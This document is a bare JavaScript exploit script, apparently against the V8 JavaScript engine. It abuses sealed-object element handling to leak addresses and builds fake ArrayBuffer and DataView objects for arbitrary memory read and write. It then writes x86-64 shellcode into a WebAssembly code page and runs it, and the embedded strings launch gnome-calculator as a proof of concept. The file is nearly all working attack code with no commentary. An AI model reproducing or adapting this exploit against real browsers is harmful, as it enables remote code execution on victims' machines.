let ab = new ArrayBuffer(8);
let farray = new Float64Array(ab);
let uarray = new Uint32Array(ab);
let wasm_code = new Uint8Array([0x0,0x61,0x73,0x6D,0x01,0x0,0x0,0x0,0x01,0x85,0x80,0x80,0x80,0x0,0x01,0x60,0x0,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x0,0x01,0x0,0x04,0x84,0x80,0x80,0x80,0x0,0x01,0x70,0x0,0x0,0x05,0x83,0x80,0x80,0x80,0x0,0x01,0x0,0x01,0x06,0x81,0x80,0x80,0x80,0x0,0x0,0x07,0x91,0x80,0x80,0x80,0x0,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x0,0x04,0x6D,0x61,0x69,0x6E,0x0,0x0,0x0A,0x8A,0x80,0x80,0x80,0x0,0x01,0x84,0x80,0x80,0x80,0x0,0x0,0x41,0x01,0x0B]);
let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];

function f2i(f) {
         farray[0] = f;
         return [uarray[0],uarray[1]]
}

function i2f(lo,hi) {
         uarray[0] = lo;
         uarray[1] = hi;
         return farray[0];
}

function hex(lo,hi) {
   console.log('0x' + hi.toString(16) + lo.toString(16));
}

function find(arr) {
	for(let i = 1; i < arr.length; i++) {
		if(arr[i] != 0)
			return i;
	}
	throw "ERROR i == arr.length";

}

function f() {
	let sc = [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xeb, 0xfe, 0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00]; 
	let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code),{});
	let f2 = wasm_mod.exports.main;
	let fmap = new Array(64);
	fmap.fill(0);

	fmap[0] = 0;
	fmap[1] = 0x0423; //instance_type;
	fmap[2] = 0;
	fmap[3] = 0x043f; //instance_type;

	let fab = [0, 0, 0, i2f(0,0x1000), i2f(0x414141), i2f(0,0x800)];
	let fdv = [0, 0, 0, i2f(0,0x424242), 0, i2f(0,0x1000)]; //what??? shit;

	let abnop = new ArrayBuffer(0x100);
	let dvnop = new DataView(abnop);
	let o = {foo: 1.1};
	for(let i = 0; i < 16; i++)
		o[i] = i+1;
    
	o[0] = 0x10; //elemtens
	o[1] = 0; //deleted
	o[2] = 0x300; //capacity
	o[3] = 0x20; //max key  
	o[4] = 0x9;
	o[5] = 0x414141;
	o[6] = 0xc0;
    
	fa = [1.1,0xff];
	let pad = new Array(0x200);
	let padsec = new Array(0x500);
	pad.fill(0x0);
	padsec.fill(0x414141);
	pad[0] = 1.1;
	let t = {foo: 2.2}; 
    
    	Object.seal(o);
    
	Object.preventExtensions(t);
    	Object.seal(t);
    	let retarget = {foo: Object}; //store
    	t[0] = 0x434343;
    
    	o[0] = o;
    	console.log(o[0x0]);
    	let leak_idx = 0;
   	if(o[0] == undefined)
        	throw "ERROR o[0] == undefined";
   	else {
   		leak_idx = find(pad);
   	}
   
   	let o_addr = f2i(pad[leak_idx]);
   	o_addr[0] = o_addr[0] - 1;
   	hex(o_addr[0],o_addr[1]);
   	o[0] = f2;
   	let f2_addr = f2i(pad[leak_idx]);
   	f2_addr[0] = f2_addr[0] - 1;
   	hex(f2_addr[0],f2_addr[1]);

   	let fab_addr = [o_addr[0] - 0x1f8 - 0x30, o_addr[1]];
   	hex(fab_addr[0],fab_addr[1]);

   	let fdv_addr = [o_addr[0] - 0xb8 - 0x8 - 0x220 + 0x440 - 0x228, o_addr[1]];;
   	hex(fdv_addr[0],fdv_addr[1]);

   	let fmap_addr = [o_addr[0] - 0x540 - 0x2b8 + 0x350 - 0xc8, o_addr[1]];
   	hex(fmap_addr[0],fmap_addr[1]);
   	fab[0] = i2f(fmap_addr[0]+1, fmap_addr[1]);
   	fdv[0] = i2f(fmap_addr[0]+0x10+1, fmap_addr[1]);
   	fdv[3] = i2f(fab_addr[0]+1, fab_addr[1]);
   
   	pad[leak_idx] = i2f(fab_addr[0]+1,fab_addr[1]);
   
   	let dv = new DataView(o[0]);
   
   	fab[4] = i2f(f2_addr[0], f2_addr[1]);
   
   	let temp = [dv.getUint32(24,true), dv.getUint32(28,true)];
   	hex(temp[0],temp[1]);   
   	fab[4] = i2f(temp[0]-1, temp[1]);
   
   	temp = [dv.getUint32(8,true), dv.getUint32(12,true)];
   	hex(temp[0]-1,temp[1]);
   	fab[4] = i2f((temp[0]-1),temp[1]);
   
        temp = [dv.getUint32(16,true), dv.getUint32(20,true)];
   	hex(temp[0]-1,temp[1]);
   	fab[4] = i2f((temp[0]-1),temp[1]);
   
   	temp = [dv.getUint32(136,true), dv.getUint32(140,true)];
   	hex(temp[0],temp[1]);
   	fab[4] = i2f((temp[0]),temp[1]);
   
   	for(let i=0; i<sc.length; i++)
   		dv.setUint8(i,sc[i],true);  
   	f2();
  
}


f();
